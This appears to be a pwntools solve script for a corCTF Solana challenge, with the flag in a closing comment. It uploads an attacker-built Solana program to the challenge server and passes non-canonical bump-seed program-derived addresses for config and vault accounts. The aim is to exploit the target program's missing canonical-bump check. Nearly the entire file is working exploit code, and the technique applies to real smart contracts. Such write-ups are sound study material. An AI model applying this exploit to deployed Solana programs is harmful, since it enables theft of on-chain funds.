#!/usr/bin/python3

from pwn import *
from base58 import b58decode, b58encode
from solana_helpers import find_program_address, find_program_address_none_canonical_bump_seed
import os

if os.system('cd ./solution && make build'):
    print('[x] Build solution program failed.')
    exit(1)

io = remote('be.ax', 30555)
# io = remote('localhost', 8080)
context.log_level='debug'

with open('./solution/dist/solution.so','rb') as f:
    content = f.read()

hacker_pubkey = b'7bstmiPeLjDPx5ATzW1xgidhwZsWj2GvuJZkVGmRtvRj'
io.sendlineafter(b'program pubkey: \n', hacker_pubkey)
io.sendlineafter(b'program len: \n',str(len(content)).encode())
io.send(content)
io.recvuntil(b'some information for you:\n')

def get_account():
    io.recvuntil(b': ')
    return io.recvline().rstrip().decode()

def pda(base_key, seed):
    acc, acc_nonce = find_program_address([seed], b58decode(base_key))
    return b58encode(acc).decode(), acc_nonce

def pda_none_canonical_bump_seed(base_key, seed, n):
    acc, acc_nonce = find_program_address_none_canonical_bump_seed([seed], b58decode(base_key), n)
    return b58encode(acc).decode(), acc_nonce

program_pubkey = get_account()
user_pubkey    = get_account()

config_pubkey_canonical,      config_pubkey_canonical_bump_seed         = pda(program_pubkey,b'CONFIG')
config_pubkey_none_canonical, config_pubkey_none_canonical_bump_seed    = pda_none_canonical_bump_seed(program_pubkey,b'CONFIG',config_pubkey_canonical_bump_seed)
vault_pubkey_canonical,       vault_pubkey_canonical_bump_seed          = pda(program_pubkey,b'VAULT')
vault_pubkey_none_canonical,  vault_pubkey_none_canonical_bump_seed     = pda_none_canonical_bump_seed(program_pubkey,b'VAULT',vault_pubkey_canonical_bump_seed)
proposal_pubkey,              proposal_pubkey_canonical_bump_seed       = pda(program_pubkey,b'PROPOSAL\x01')

# metas
accs = [
    f"ws {user_pubkey}",
    f"w {config_pubkey_none_canonical}",
    f"w {vault_pubkey_canonical}",
    f"w {program_pubkey}",
    f"w {vault_pubkey_none_canonical}",
    f"w {proposal_pubkey}",
    f"r 11111111111111111111111111111111"
]

io.sendlineafter("num accounts: \n", str(len(accs)).encode())
for acc in accs:
    io.sendline(acc.encode())
# ix
buf  = p8(config_pubkey_none_canonical_bump_seed)
buf += p8(vault_pubkey_none_canonical_bump_seed)
io.sendlineafter('len:',str(len(buf)).encode())
io.send(buf)
print(io.recvall())
# io.interactive()

# corctf{its_y0ur_time_to_f4ce_the_CoR_tribunal}